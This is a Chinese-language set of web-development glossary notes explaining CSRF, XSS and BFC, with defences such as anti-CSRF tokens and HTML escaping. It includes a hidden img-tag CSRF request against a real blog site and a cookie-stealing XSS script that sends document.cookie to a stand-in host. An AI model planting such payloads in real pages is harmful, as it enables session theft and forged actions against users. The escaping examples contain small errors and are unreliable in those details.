# 术语

## CSRF
CSRF（Cross-site request forgery）跨站请求伪造
XSS 利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。
理解：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等

### CSRF 攻击示例 
CSRF攻击攻击原理及过程如下：

1. 用户 C 打开浏览器，访问受信任网站 A，输入用户名和密码请求登录网站 A；
2. 在用户信息通过验证后，网站 A 产生 Cookie 信息并返回给浏览器，此时用户登录网站 A 成功，可以正常发送请求到网站 A；
3. 用户未退出网站 A 之前，在同一浏览器中，打开一个 TAB 页访问网站 B（恶意网站）；
4. 网站 B 接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点 A；
5. 浏览器在接收到这些攻击性代码后，根据网站 B 的请求，在用户不知情的情况下携带 Cookie 信息，向网站 A 发出请求。网站 A 并不知道该请求其实是由B发起的，所以会根据用户 C 的 Cookie 信息以 C 的权限处理该请求，导致来自网站 B 的恶意代码被执行

示例：

假如博客园有个加关注的 GET 接口，如下：
http://www.cnblogs.com/mvc/Follow/FollowBlogger.aspx?blogUserGuid=4e8c33d0-77fe-df11-ac81-842b2b196315

blogUserGuid 参数很明显是关注人Id，那我只需要在我的一篇博文内容里面写一个img标签：
```html
<img style="width:0;" src="http://www.cnblogs.com/mvc/Follow/FollowBlogger.aspx?blogUserGuid=4e8c33d0-77fe-df11-ac81-842b2b196315"/>
```
那么只要有人打开我这篇博文，那就会自动关注我


基于以上：

CSRF攻击的本质原因
CSRF攻击是源于 Web 的隐式身份验证机制。Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的，CSRF攻击的一般是由服务端解决

### CSRF 的防御

1. 尽量使用POST，限制GET
GET 接口太容易被拿来做CSRF攻击，只要构造一个img标签，将恶意链接放入 src 属性，就会自动调用。而img标签又是不能过滤的数据。接口最好限制为POST使用，GET则无效，降低攻击风险。

当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性

2. 加验证码
验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案

3. CSRF Token

现在业界对CSRF的防御，一致的做法是使用一个Token（Anti CSRF Token）。

例子：
1. 用户访问某个表单页面。
2. 服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。
3. 在页面表单附带上Token参数。
4. 用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。
这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露

注意：
CSRF的Token仅仅用于对抗CSRF攻击。当网站同时存在XSS漏洞时候，那这个方案也是空谈。所以XSS带来的问题，应该使用XSS的防御方案予以解决

总结
CSRF攻击是攻击者利用用户的身份操作用户帐户的一种攻击方式，通常使用Anti CSRF Token来防御CSRF攻击，同时要注意Token的保密性和随机性

## XSS
跨站脚本攻击(Cross Site Scripting)
为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS
原理是攻击者往 web 页面里插入恶意的脚本代码（CSS代码、JavaScript代码等），当用户浏览该页面时，嵌入其中的脚本代码会被执行，从而达到恶意攻击用户的目的。如盗取用户cookie，破坏页面结构、重定向到其他网站等

理论上来说，web 页面中所有可由用户输入的地方，如果没有对输入的数据进行过滤处理的话，都会存在 XSS 漏洞；当然，我们也需要对模板视图中的输出数据进行过滤

### XSS 攻击示例
有一个博客网站，提供了一个 web 页面（内含表单）给所有的用户发表博客，但该博客网站的开发人员并没有对用户提交的表单数据做任何过滤处理。 现在，我是一个攻击者，在该博客网站发表了一篇博客，用于盗取其他用户的cookie信息。博客内容如下：
```js
<script>
  var cookie = document.cookie;
  window.open("http://demo.com/getCookie.php?param="+cookie);
</script>
```
这是一段 XSS 攻击代码。当其他用户查看我的这篇博客时，他们的 cookie 信息就会被发送至我的 web 站点（http://demo.com/） ，如此，我就盗取了其他用户的 cookie 信息

### XSS 的防御
永远不要相信用户的输入，必须对输入的数据作过滤处理

1. 对用户输入内容格式做校验（表单校验）
2. 将所有的 [<,>,”,,&] 等符号都用 [<,>,",&] 字符进行替换，这些html标签符号被替换后，浏览器就会拿它当作一个普通字符串对待，而不是当作一个标签的开始/结束标志对待

前端过滤
```js
var escapeHtml = function(str) {
  if(!str) return '';
  str = str.replace(/&/g, '&amp;');
  str = str.replace(/</g, '&lt;');
  str = str.replace(/>/g, '&gt;');
  str = str.replace(/"/g, '&quto;');
  return str;
};

var name = escapeHtml(`<script>alert('lalala')</script>`);
// 此时 name 会变成
// &lt;script&gt;alert('lalala')&lt;/script&gt;
```

后端过滤
```js
String content = "<script>alert('ok');</script>";
content= StringEscapeUtils.escapeHtml4(content);
// 被转后后成为了&lt;script&gt;alert('ok');&lt;/script&gt;字符串，然后再输出到浏览器
```


## BFC
块级格式化上下文
W3C 对 BFC 的定义如下：

浮动元素和绝对定位元素，非块级盒子的块级容器（例如 inline-blocks, table-cells, 和 table-captions），以及overflow值不为“visiable”的块级盒子，都会为他们的内容创建新的BFC（块级格式上下文）。
为了便于理解，我们换一种方式来重新定义BFC。一个HTML元素要创建BFC，则满足下列的任意一个或多个条件即可：

1. float的值不是none。
2. position的值不是static或者relative。
3. display的值是inline-block、table-cell、flex、table-caption或者inline-flex
4. overflow的值不是visible

BFC是一个独立的布局环境，其中的元素布局是不受外界的影响，并且在一个BFC中，块盒与行盒（行盒由一行中所有的内联元素所组成）都会垂直的沿着其父元素的边框排列。